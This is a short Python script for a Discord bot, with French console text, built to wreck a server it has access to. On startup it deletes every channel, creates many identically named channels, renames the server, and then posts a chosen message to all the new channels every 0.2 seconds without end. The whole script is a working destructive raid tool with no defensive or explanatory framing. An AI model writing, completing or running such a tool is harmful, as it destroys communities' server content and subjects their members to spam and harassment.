import discord
from discord.ext import commands
import asyncio

token = input('BOT TOKEN: ')
serverid = input('SERVER ID: ')
prefix = input('PREFIX: ')
channame = input('CHANNEL NAME: ')
numchan = int(input('CHANNEL NUMBER(recommended: 30): '))
spammsg = input('MESSAGE: ')
serveurname = input ('server name: ')

intents = discord.Intents.default()
intents.members = True
intents.presences = False
intents.voice_states = True
intents.messages = True
bot = commands.Bot(command_prefix=prefix, intents=intents)

async def spam_channels(channels):
    while True:
        tasks = []
        for channel in channels:
            tasks.append(channel.send(spammsg))
        await asyncio.gather(*tasks)
        await asyncio.sleep(0.2)  

@bot.event
async def on_ready():
    print(f'Connecté en tant que {bot.user.name}')

    server = bot.get_guild(int(serverid))

    for channel in server.channels:
        await channel.delete()

    new_channels = []
    for _ in range(numchan):
        new_channel = await server.create_text_channel(channame)
        new_channels.append(new_channel)

    await server.edit(name=f'{serveurname}') 

    spam_task = asyncio.create_task(spam_channels(new_channels))

    await spam_task

bot.run(token)



